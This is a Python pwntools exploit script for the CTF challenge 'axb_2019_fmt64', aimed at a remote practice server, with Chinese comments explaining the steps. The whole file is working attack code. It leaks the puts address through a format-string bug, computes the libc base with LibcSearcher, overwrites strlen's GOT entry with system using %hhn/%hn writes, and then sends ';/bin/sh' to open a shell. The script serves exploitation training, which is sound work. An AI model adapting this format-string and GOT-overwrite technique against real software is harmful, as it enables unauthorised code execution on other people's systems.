from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
binary = './axb_2019_fmt64'
# io = process(binary)
# io= gdb.debug(binary,"break *0x0400957")
io = remote('node4.buuoj.cn',29106)
elf = ELF(binary)
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')

def ret2libc(leak, func, search_fun, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)


# aaaa.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
printf_got = elf.got['printf']
strlen_got = elf.got['strlen']
puts_got = elf.got['puts']

payload = b"%9$s" + b"aaaa" + p64(puts_got)
#首先偏移是8，其实一开始gdb查看时感觉是2但后来发现忽略了64位下寄存器会传递参数6位，所以是8
#其次64位程序的got表多有\x00截断，所以必须要把got表地址放在尾部防止截断，偏移因此8+1=9
#另外本题远程只能用puts的got表不能用printf的got表，strlen和puts都可以，猜测环境问题
io.sendafter(b'Please tell me:', payload)

io.recvuntil(b'Repeater:')
puts_addr = u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))
log.success('puts_addr ------> ' + hex(puts_addr))
base, system_addr, bin_sh_addr, strlen_addr = ret2libc(puts_addr, 'puts', 'strlen')


log.success('strlen_addr ------> ' + hex(strlen_addr))
log.success('system_addr ------> ' + hex(system_addr))
#注意64位程序不能使用fmtstr_payload模块来写格式化字符串payload（）
#由于64位数字可能很大，导致传输超时的现象（例如这道题只允许3s的传输时间（此原因未经debug证实）
# payload = fmtstr_payload(9, {strlen_got: system_addr},numbwritten=0x10, write_size='byte')

#注意这里只修改了strlen_got的低三个字节，低四个字节都会失败
high_system = (system_addr >> 16) & 0xff
low_system = system_addr & 0xffff
# payload = p32(strlen_got) + p32(strlen_got + 2) + b'%' + int2bytes(low_system-18) + b'c%8$hn'+ b'%' + int2bytes(high_system-low_system) + b'c%9$hn'
payload = b'%' + int2bytes(high_system - 9) + b'c%12$hhn' + b"%" + int2bytes(low_system - high_system) + b"c%13$hn"
payload  = payload.ljust(0x20,b'A') + p64(strlen_got + 2) + p64(strlen_got)
#这里ljust到0x20位是为了对齐，因为上面的payload长度为0x19

io.sendafter(b'Please tell me:', payload)

io.sendafter(b'Please tell me:', b';/bin/sh\x00')
io.interactive()